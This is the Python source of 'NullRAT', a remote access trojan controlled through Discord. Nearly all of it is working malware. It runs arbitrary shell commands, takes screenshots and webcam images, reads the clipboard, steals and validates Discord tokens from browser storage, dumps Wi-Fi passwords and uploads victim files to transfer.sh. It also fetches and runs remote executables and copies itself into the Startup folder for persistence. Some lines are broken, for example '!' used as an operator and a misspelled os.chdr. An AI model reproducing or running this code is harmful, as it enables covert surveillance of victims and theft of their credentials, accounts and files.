from Variables import *

import disnake as discord
from disnake import Embed
from disnake.ext import commands

from mss import mss
from datetime import datetime
from socket import create_connection
from base64 import decodebytes, b64decode
import os, subprocess, re, time, aiohttp, requests

original_dir = os.getcwd()
client = commands.InteractionBot(test_guilds=server_ids)
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

if !os.path.isdir(nr_working):
    os.mkdir(nr_working)
    
@client.event
async def on_ready():
    embed = Embed(
        title = f"NullRAT v8.4 started on: **{IP()}**", 
        description = f"Currently present in: **{original_dir}**",
        timestamp = datetime.now()
    )
    embed.set_author(
        name="NullCode1337", 
        url=r"http://nullcode1337.42web.io/", 
        icon_url=r"https://cdn.discordapp.com/attachments/959480539335766036/984699113734037544/embed_pfp2.png"
    )
    embed.set_footer(
        text = f"Infection date:"
    )
    await client.get_channel(notification_channel).send(embed=embed)

# Intelligence Gathering #
@client.slash_command(name="listvictims", description="Finds the values of environment variables" )
async def command(ctx):
    await ctx.channel.send( 
        embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}") 
    )
    await ctx.response.send_message("Checking all available victims...")


@client.slash_command(
    name="getenv",
    description="Finds the values of environment variables",
    options=[
        discord.Option("victim", description="IP Address of specific victim", required=True),
        discord.Option("environment", description="The variable of which the value is wanted", required=True)
    ],
)
async def command(ctx, victim: str, environment: str):
    if str(victim) == str(IP()):
        try: 
            value = os.getenv(environment)
        except: 
            return await ctx.response.send_message(embed=discord.Embed(title="Invalid environment variable!"))
            
        if value is None:
            return await ctx.response.send_message(embed=discord.Embed(title="Invalid environment variable!"))
            
        if len(value) >= 1023:
            return await ctx.response.send_message(f"The value for {environment} is:\n```{value}```")
            
        await ctx.response.send_message(
            embed = Embed(
                title=f"Found environment variable", 
                timestamp = datetime.now()
            ).add_field(
                name="Value for "+environment+" is:", 
                value="```"+value+"```"
            )
        )


@client.slash_command(
    name="geolocate",
    description="Finds all geolocation information of victim",
    options=[
        discord.Option("victim", description="IP Address of specific victim", required=True),
    ],
)
async def command(ctx, victim):
    if str(victim) == str(IP()):
        await ctx.response.defer()
        
        data = requests.get("http://ip-api.com/json/").json()
        if data["status"] != "success": 
            return await ctx.send("```Unable to get Geolocation Info!```")
            
        embed = discord.Embed(
            title="Geolocation Information\n(Powered by ip-api)", 
            description=f"[Google Maps link](https://www.google.com/maps/search/google+map++{data['lat']},{data['lon']})",
            timestamp=datetime.now()
        )
            
        embed.add_field( name="Country", value=f"{data['country']} ({data['countryCode']})" )
        embed.add_field( name="City",    value=data["city"]       )
        embed.add_field( name="Region",  value=data["regionName"] )
        embed.add_field( name="Zip code", value=data["zip"]       )
        embed.add_field( name="ISP",      value=data["isp"]       )
        embed.add_field( name="Timezone", value=data["timezone"]  )
        
        await ctx.followup.send(embed=embed)


@client.slash_command(
    name="get_webcam",
    description="Capture image from webcam",
    options=[
        discord.Option("victim", description="IP Address of specific victim", required=True),
    ],
)
async def command(ctx, victim):
    if str(victim) == str(IP()):
        await ctx.response.defer()
        
        webcam = bytes(
            requests.get(
                "https://raw.githubusercontent.com/NullCode13-Misc/CommandCam/master/CommandCam_binary_base64"
            ).text, "utf-8"
        )
        
        os.chdir(nr_working)
        with open("cc.exe", "wb") as fh: 
            fh.write(decodebytes(webcam))
            
        subprocess.run(
            "cc.exe & ren image.bmp image.png", 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            stdin=subprocess.PIPE
        )
        
        await ctx.followup.send(
            embed=discord.Embed(
                title="Image taken from webcam:", 
                timestamp=datetime.now()
            ), 
            file=discord.File(
                nr_working + "\\image.png"
            )
        )
        os.remove(nr_working + "\\image.png")
        os.remove(nr_working + "\\cc.exe")
        os.chdir(original_dir)   
  
  
@client.slash_command(description="Sends General System Information")
async def systeminfo(ctx, victim):
    if str(victim) == str(IP()):
        await ctx.response.defer()
        subprocess.run(
            f'SYSTEMINFO > "{nr_working}\\youtube.txt"',
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        )
        await ctx.followup.send(
            embed=discord.Embed(title="General System Info:", color=0x0081FA), 
            file=discord.File(nr_working + "\\youtube.txt", filename="General Output.txt"), 
        )
        os.remove(nr_working + "\\youtube.txt")


@client.slash_command(description="Sends screenshot of entire monitor")
async def screenshot(ctx, victim):
    if str(victim) == str(IP()):
        await ctx.response.defer()
        with mss() as sct: sct.shot(output=nr_working+"\\monitor.png")
        file = discord.File(nr_working + "\\monitor.png")
        await ctx.followup.send(
            embed=discord.Embed(title="Screenshot of victim's PC:", color=0x0081FA), 
            file=file
        )
        time.sleep(2)
        os.remove(nr_working + "\\monitor.png")

@client.slash_command(description="Sends text contents of clipboard")
async def clipboard(ctx, victim):
    if str(victim) == str(IP()):
        await ctx.response.defer()
        outp = os.popen("powershell Get-Clipboard").read()
        await ctx.followup.send(f"```{outp}```" if outp != "" else "No text in clipboard!")

@client.slash_command(description="Sends raw Discord Tokens (fast)")
async def raw_tokens(ctx, victim):
    if str(victim) == str(IP()):
        await ctx.response.defer()
        message, tokens = "", find_token()
        for token in tokens: 
            message += token + "\n"
        if len(message) >= 1023: 
            return await ctx.followup.send("```" + message + "```")
        embed = Embed(title="Discord Tokens (NullRAT):", color=0x0081FA).add_field(name="RAW Tokens:", value=f"```{message.rstrip()}```")
        embed.set_footer(text="Written by NullCode1337")
        await ctx.followup.send(embed=embed)

@client.slash_command(description="Sends checked tokens along with info (accurate)")
async def checked_tokens(ctx, victim):
    if str(victim) == str(IP()):
        await ctx.response.defer()
        valid, email, phone, uname, nitro, bill, avatar, idq = [], [], [], [], [], [], [], []

        for token in find_token():
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            requ = get('https://discordapp.com/api/v6/users/@me', headers=headers)

            if requ.status_code == 401: continue
            if requ.status_code == 200:
                valid.append( str(token) )
                json = requ.json()
                email.append( str(json['email']) )
                phone.append( str(json['phone']) ) 
                idq.append(   str(json["id"])   )            
                uname.append( f'{json["username"]}#{json["discriminator"]}' )
                avatar.append(f"https://cdn.discordapp.com/avatars/{str(json['id'])}/{str(json['avatar'])}" )
                nitro.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()) > 0)))
                bill.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()) > 0)))
                continue

        if len(valid) == 0: 
            return await ctx.followup.send(embed = Embed(title="No valid Discord Tokens"))
        await ctx.followup.send("Checking all tokens...")
        for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
            await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa)) 

@client.slash_command(description="[EXPERIMENTAL] Decrypts encrypted Discord Tokens")
async def discord_tokens(ctx, victim):
    if str(victim) == str(IP()):
        import os
        await ctx.response.defer()
        try:
            tkr = bytes(get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
            await ctx.channel.send("Status:\n> Downloaded custom decryptor")
        except Exception as e:
            return await ctx.followup.send("Unable to download custom decryptor!\n\n"+e)
            
        os.chdir(nr_working)
        
        with open("tkr.exe", "wb") as fh: fh.write(decodebytes(tkr))
        await ctx.channel.send("> Prepared custom decryptor")
        discord_tokenz = str(os.popen("tkr.exe").read()).strip('][').split(', ')
        await ctx.channel.send("> Attempted to decrypt tokens from discord...")
        
        msg = "Done!\n```"
        for a in discord_tokenz:
            msg += a + "\n"
        msg += "```"
        await ctx.followup.send(msg)
        os.remove(nr_working + "\\tkr.exe")
        os.chdir(original_dir)   

@client.slash_command(description="[EXPERIMENTAL] Decrypts and checks encrypted Discord Tokens")
async def discord_checked(ctx, victim):
    if str(victim) == str(IP()):
        import os
        await ctx.response.defer()
        try:
            tkr = bytes(get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
        except Exception as e:
            return await ctx.followup.send("Unable to download custom decryptor!\n\n"+e)
            
        os.chdir(nr_working)
        with open("tkr.exe", "wb") as fh: fh.write(decodebytes(tkr))
        discord_tokenz = str(os.popen("tkr.exe").read()).strip('][').split(', ')
        
        valid, email, phone, uname, nitro, bill, avatar, tks, idq = [], [], [], [], [], [], [], [], []
        for a in discord_tokenz: tks.append(a.replace('"',''))
        for token in tks:
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            requ = get('https://discordapp.com/api/v6/users/@me', headers=headers)
                        
            if requ.status_code == 401: 
                await ctx.channel.send(embed=discord.Embed(title="Token is invalid!",description=token))
                continue
            if requ.status_code == 200:
                valid.append( str(token) )
                json = requ.json()
                email.append( str(json['email']) )
                phone.append( str(json['phone']) ) 
                idq.append(   str(json["id"])   )            
                uname.append( f'{json["username"]}#{json["discriminator"]}' )
                avatar.append(f"https://cdn.discordapp.com/avatars/{str(json['id'])}/{str(json['avatar'])}" )
                nitro.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()) > 0)))
                bill.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()) > 0)))
                continue

        if len(valid) == 0: 
            return await ctx.followup.send(embed = Embed(title="No valid Discord Tokens"))
        await ctx.followup.send("Checking all tokens...")
        for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
            await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa)) 
        
# Directory Manipulation #
@client.slash_command(description="Returns Current Working Directory")
async def get_workingdir(ctx, victim):
    if str(victim) == str(IP()):
       await ctx.response.send_message(embed=EmbedGen("Current directory", "The present directory is: ", f"```{os.getcwd()}```"))
    
@client.slash_command(description="Send file to victim's PC")
async def sendfiles(ctx, victim, url, file_name, file_path=nr_working):
    if str(victim) == str(IP()):
        await ctx.response.defer()
        if '"' in file_path:
            file_path = file_path.replace('"','')
        try: os.chdir(file_path)
        except: return await ctx.followup.send("Invalid directory!")
        r = get(url, allow_redirects=True)
        with open(file_name, "wb") as f: f.write(r.content)
        await ctx.followup.send(embed=EmbedGen("Upload information", "Sending file to victim: ", "Success"))

@client.slash_command(description="Receives file from victim's PC")
async def receivefiles(ctx, victim, file):
    if str(victim) == str(IP()):
        await ctx.response.defer()
        if '"' in file:
            file = file.replace('"','')
        try: f = open(file, "rb")
        except: return await ctx.followup.send(embed=EmbedGen("Error while downloading!", "FileNotFoundError", "Please specify a different path and try again"))
        file = {'{}'.format(file): f}
        response = post('https://transfer.sh/', files=file)
        download_link = response.content.decode('utf-8')
        embed=discord.Embed(title="Download Inforation", description="Receiving file from victim: Success")
        embed.add_field(name="Download link is:", value="download_link")
        return await ctx.followup.send(embed=embed)

@client.slash_command(description="Change directory to specified location")
async def change_directory(ctx, victim, directory):
    if str(victim) == str(IP()):
        try:
            os.chdir(directory)
            return await ctx.response.send_message(embed=EmbedGen("CD information",  "Changed directory to:", f"```{os.getcwd()}```"))
        except FileNotFoundError:
            await ctx.response.send_message(embed=EmbedGen("CD information", "Changing directory failed!", "```Error: Incorrect Path```"))

@client.slash_command(description="Finds contents of directory")
async def list_directory(ctx, victim, directory_to_find="null"):
    if str(victim) == str(IP()):
        await ctx.response.defer()
        if directory_to_find == "null":
            directory_to_find = os.getcwd()
            subprocess.run(f'dir > "{nr_working}\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            try: os.chdir(directory_to_find)
            except: return await ctx.followup.send(embed=Embed(title="Invalid directory! Please try again :)"))
            subprocess.run(f'dir > "{nr_working}\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        file = discord.File(
            os.path.join(nr_working + "\\dir.txt"), filename="Directory.txt"
        )
        embed=discord.Embed(title="Contents of directory are:", description=directory_to_find)
        await ctx.followup.send(embed=embed, file=file)
        os.remove(nr_working + "\\dir.txt")
        os.chdir(original_dir)

# Misc. Commands #
@client.slash_command(description="Add NullRAT to startup directory")
async def startup(ctx, victim):
    if str(victim) == str(IP()):
        from sys import executable; msg = "```\n"
        await ctx.response.send_message(embed = Embed(title = "Last known RAT directory: \n" + original_dir + "\n\nCurrent Directory: \n" + os.getcwd(), color = 0x0081FA))
        os.chdir(original_dir)
        await ctx.followup.send(embed = Embed(title = "Trying to copy payload into startup directory...", color = 0x0081FA))
        subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        os.chdir(os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        for value in os.listdir(): msg += f'{value}\n'
        msg += "```"; await ctx.followup.send(msg, embed=Embed(title="If you see the program here, you're good to go: ", color=0x0081FA))

@client.slash_command(description="Executes shell commands")
async def shell(ctx, victim, msg): 
    if str(victim) == str(IP()):
        await ctx.response.defer()
        global status; status = None
        from threading import Thread
        def shell():
            output = subprocess.run(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            global status; status = "ok"; return output
        shel = Thread(target=shell); shel._running = True; shel.start()
        time.sleep(2); shel._running = False
        if status:
            result = str(shell().stdout.decode("CP437"))
            print(result)
            numb = len(result)
            print(numb)
            if numb < 1:
                return await ctx.followup.send(
                    embed=EmbedGen("Information",  "Command Output:", "Command not recognized or no output was obtained")
                )
            elif numb > 1990:
                os.chdr(nr_working)
                f1 = open("shell.txt", "a")
                f1.write(result)
                f1.close()
                file = discord.File("shell.txt", filename="shell.txt")
                return await ctx.followup.send("Command successfully executed", file=file)
                os.popen("del shell.txt")
            else:
                return await ctx.followup.send(f"```{result}```")
        else:
            await ctx.followup.send(
                embed=EmbedGen("Information",  "Command Output:", "Command not recognized or no output was obtained")
            )
            status = None

@client.slash_command(description="Lists all wifi networks")
async def wifilist(ctx, victim):
    if str(victim) == str(IP()):
        await ctx.response.send_message(f"```{os.popen('netsh wlan show profiles').read().replace('All', '').replace('Profile', 'Network')}```")

@client.slash_command(description="Lists specified wifi password")
async def wifipass(ctx, victim, name):
    if str(victim) == str(IP()):
        a = os.popen('netsh wlan show profile '+'"'+name.lstrip().rstrip()+'" '+"key=clear | findstr Key")
        await ctx.response.send_message(f"```{a.read()}```")
        
@client.slash_command(description="Hide file")
async def hidefile(ctx, victim, file):
    if str(victim) == str(IP()): 
        if '"' in file:
            file = file.replace('"','')
        output = os.popen("attrib +h " + '"' + file + '"').read()
        if "not" in output: return await ctx.response.send_message("Unable to hide file. Check path and try again")
        
        await ctx.response.send_message("File hidden successfully")
                    
@client.slash_command(description="Unhide file")
async def unhidefile(ctx, victim, file):
    if str(victim) == str(IP()): 
        if '"' in file:
            file = file.replace('"','')
        output = os.popen("attrib -h " + '"' + file + '"').read()
        if "not" in output: return await ctx.response.send_message("Unable to show file. Check path and try again")
        
        await ctx.response.send_message("File unhidden successfully")
            
@client.slash_command(description="Quits NullRAT from specified IP")
async def close(ctx, victim):
    if str(victim) == str(IP()):
        await ctx.response.send_message(embed=EmbedGen("Information", "Given IP is " + IP(), "Closing NullRAT..."))
        await client.close()
    if "." not in ip:
        return await ctx.response.send_message(embed=EmbedGen("Information", "Given IP is incorrect!", "Please try again"))  
        
@client.slash_command(description="Quits all instances of NullRAT")
async def close_all(ctx):
    await ctx.response.send_message("Are you sure?", view=closeall_confirm())
      
class closeall_confirm(discord.ui.View):
    @discord.ui.button(label="Yes", style=discord.ButtonStyle.danger)
    async def first_button_callback(self, button, interaction):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(view=self) 
        await interaction.channel.send(embed=Embed(title="Closing all instances of NullRAT...")) 
        await client.close()
        
    @discord.ui.button(label="No", style=discord.ButtonStyle.primary)
    async def second_button_callback(self, button, interaction):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(view=self) 
        await interaction.channel.send(embed=Embed(title="Aborted shut-down"))   
        
# Required Functions
def IP():
    try: return requests.get("http://icanhazip.com/").text.rstrip()
    except: return "127.0.0.1"

def is_connected():
    try: create_connection(("1.1.1.1", 53)); return True
    except OSError: return False

def EmbedGen(title_main, name, value):
    color = 0x0081FA
    embed = Embed(title=title_main, color=color)
    embed.add_field(name=name, value=value)
    embed.set_footer(text="Written by NullCode1337")
    return embed

def find_token():
    tokens = tokens2 = []
    local, roaming = os.getenv("LOCALAPPDATA"), os.getenv("APPDATA")
    paths = {
        "Lightcord": roaming + "\\Lightcord",
        "Opera": roaming + "\\Opera Software\\Opera Stable",             "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
        "Chrome": local + "\\Google\\Chrome\\User Data\\Default",        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default", "Vivaldi": local + "\\Vivaldi\\User Data\\Default",
        "MSEdge": local + "\\Microsoft\\Edge\\User Data\\Default",       "Chromium": local + "\\Chromium\\User Data\\Default"
    }
    for platform, path in paths.items():
        path += '\\Local Storage\\leveldb'
        try: 
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): 
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line): 
                            tokens.append(token)
        except FileNotFoundError: continue
    def englishOnly(s): return s.isascii()
    goodTKs = []
    for t in tokens:
        if englishOnly(t): goodTKs.append(t)
    return goodTKs

def checked_embeds(tk, em, ph, un, ni, bi, av, idqa):
    embed=discord.Embed(title="Checked Token", description="*Tokens checked by NullRAT*")
    embed.set_author(name="NullCode1337", url="https://github.com/NullCode1337")
    embed.set_thumbnail(url=av)
    embed.add_field(name="Token", value=f"```{tk}```", inline=False)
    embed.add_field(name="Username", value=un, inline=True)
    embed.add_field(name="ID", value=idqa, inline=True)
    embed.add_field(name="Nitro", value=ni, inline=True)
    embed.add_field(name="Billing Info", value=bi, inline=True)
    embed.add_field(name="Email", value=em, inline=True)
    embed.add_field(name="Phone Number", value=ph, inline=True)
    return embed

while is_connected() == False: 0
client.run(bot_token)